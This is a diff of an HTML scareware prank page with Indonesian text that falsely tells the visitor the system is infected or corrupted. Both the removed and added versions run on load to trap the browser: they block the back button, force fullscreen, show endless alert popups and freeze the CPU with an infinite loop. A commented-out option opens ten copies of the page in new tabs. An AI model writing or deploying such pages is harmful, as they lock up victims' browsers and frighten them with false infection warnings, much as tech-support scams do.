@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>💀 SYSTEM INFECTED</title>
+  <title>💀 SYSTEM CORRUPTED</title>
   <style>
     html, body {
       margin: 0;
@@ -16,71 +16,66 @@
     }
 
     h1 {
-      font-size: 50px;
-      text-shadow: 0 0 10px red;
+      font-size: 48px;
+      text-shadow: 0 0 8px red;
     }
 
     @keyframes shake {
-      0% { transform: translate(1px, 1px); }
-      25% { transform: translate(-1px, -1px); }
-      50% { transform: translate(2px, 2px); }
-      75% { transform: translate(-2px, -2px); }
+      0% { transform: translate(2px, 1px); }
+      25% { transform: translate(-2px, -2px); }
+      50% { transform: translate(3px, 2px); }
+      75% { transform: translate(-3px, 1px); }
       100% { transform: translate(0, 0); }
     }
   </style>
 </head>
 <body>
-  <h1>💀 SYSTEM INFECTED</h1>
-  <p>❗ Jangan tutup tab ini. Virus sedang aktif...</p>
+  <h1>💀 SYSTEM CORRUPTED!</h1>
+  <p>⚠️ Semua file anda sedang dipindai...</p>
 
   <script>
-    // 🔁 Lock back button (navigasi)
+    // Blok tombol kembali
     history.pushState(null, "", location.href);
     window.onpopstate = function () {
       history.pushState(null, "", location.href);
     };
 
-    // 🔁 Infinite alert spam
-    function alertLoop() {
-      alert("🚨 VIRUS AKTIF! JANGAN DITUTUP!");
-      setTimeout(alertLoop, 100);
-    }
-
-    // 🔄 Reload loop
-    setInterval(() => {
-      location.reload();
-    }, 1500);
-
-    // 🧠 Freeze loop
-    function lagForever() {
-      while (true) {
-        Math.pow(Math.random() * Date.now(), 5.5);
-      }
-    }
-
-    // 🔇 Coba auto fullscreen (tidak semua browser izinkan)
-    function goFullScreen() {
+    // Fullscreen paksa
+    function forceFullScreen() {
       if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen();
+        document.documentElement.requestFullscreen().catch(() => {});
       }
     }
 
-    // 🔒 Paksa coba tutup (jarang berhasil di HP)
-    function tryCloseTab() {
-      try {
-        window.open('', '_self').close();
-      } catch (e) {}
+    // Spam alert
+    function startAlertSpam() {
+      setTimeout(() => {
+        alert("🚨 SYSTEM FAILURE: Jangan tutup tab ini!");
+        startAlertSpam(); // panggil lagi
+      }, 200);
     }
 
-    // Jalankan semua efek saat load
-    window.onload = () => {
-      setTimeout(() => {
-        goFullScreen();
-        alertLoop();
-        lagForever();
-        tryCloseTab();
-      }, 500);
-    };
+    // Super heavy lag
+    function freezeCPU() {
+      while (true) {
+        let x = Math.pow(Math.random() * Date.now(), 10);
+      }
+    }
+
+    // (Optional) Spam tab baru (serem, tapi hati-hati)
+    function openSpamTabs() {
+      for (let i = 0; i < 10; i++) {
+        window.open(window.location.href, "_blank");
+      }
+    }
+
+    // Mulai semuanya
+    setTimeout(() => {
+      forceFullScreen();
+      startAlertSpam();
+      // openSpamTabs(); // Aktifkan ini jika mau spam tab baru
+      freezeCPU(); // freeze browser
+    }, 1000);
   </script>
 </body>
 </html>
